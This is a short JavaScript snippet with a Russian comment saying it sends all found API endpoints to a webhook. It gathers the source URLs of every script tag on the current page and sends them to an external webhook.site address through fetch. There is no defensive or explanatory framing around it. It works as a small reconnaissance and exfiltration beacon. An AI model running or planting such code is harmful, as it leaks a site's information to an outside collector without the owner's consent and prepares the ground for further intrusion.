// Этот скрипт отправит на webhook все найденные API endpoints
const scripts = document.querySelectorAll('script');
let sources = '';
scripts.forEach(script => sources += script.src + '\n');
fetch('https://webhook.site/bd10e25e-f1b3-4e2f-89b9-7362b1151c96?scan=' + encodeURIComponent(sources));
